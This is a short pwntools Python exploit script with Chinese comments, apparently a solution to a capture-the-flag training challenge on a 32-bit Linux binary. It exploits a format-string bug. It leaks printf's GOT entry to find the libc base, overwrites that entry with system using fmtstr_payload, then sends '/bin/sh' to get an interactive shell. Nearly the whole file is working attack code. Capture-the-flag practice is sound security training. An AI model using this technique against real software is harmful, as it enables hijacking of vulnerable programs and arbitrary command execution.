from pwn import *



context(arch='i386',os='linux')
context.terminal=["tmux","splitw","-h"]

 #打印printf的got表
elf =ELF("./pwn/string/fmt-5/fmt5")
printf_got=elf.got['printf']
log,info("printf_got: {0}".format(hex(printf_got)))

r=process("./pwn/string/fmt-5/fmt5")
# r=remote("train2024.hitctf.cn",26356)
print(r.recvline())

#利用格式化漏洞，泄漏出printf在libc中的真实地址
payload=p32(printf_got)+b'%6$s'
r.sendline(payload)

# gdb.attach(r, 'b printf')
printf_str = r.recv()
print(printf_str)

printf_address = u32(printf_str[4:8])
log,info("printf: {0}".format(hex(printf_address)))
puts_address = u32(printf_str[8:12])
log,info("puts: {0}".format(hex(puts_address)))

# libc=ELF('./pwn/string/fmt-5/libc6_2.35-0ubuntu3.4_i386.so')
libc=ELF('/lib/i386-linux-gnu/libc.so.6')
printf_offset=libc.symbols['printf']
libc_address = printf_address-printf_offset
log,info("libc: {0}".format(hex(libc_address)))

#Hook(劫持got表) 将printf替换成system
system_off=libc.symbols['system']
system_addr=libc_address+system_off
log,info("system_addr: {0}".format(hex(system_addr)))
payload=fmtstr_payload(6,{printf_got:system_addr})

r.sendline(payload)


r.sendline(b"/bin/sh\0")

r.interactive()